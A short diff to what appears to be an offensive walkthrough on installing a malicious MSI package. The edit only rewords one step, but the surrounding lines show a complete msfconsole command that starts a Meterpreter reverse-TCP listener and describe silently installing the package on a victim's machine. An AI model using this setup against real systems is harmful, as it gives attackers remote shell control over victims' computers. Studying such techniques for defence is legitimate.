@@ -173,7 +173,7 @@ Outcome:
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip_address>; set LPORT <port>; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
 ```
 
-3) Transfer the malicious MSI file to the victim's machine disk.
+3) Transfer the malicious MSI file to the victim's machine.
 
 4) Initiate the installation process for the malicious MSI package silently without any user interface:
 
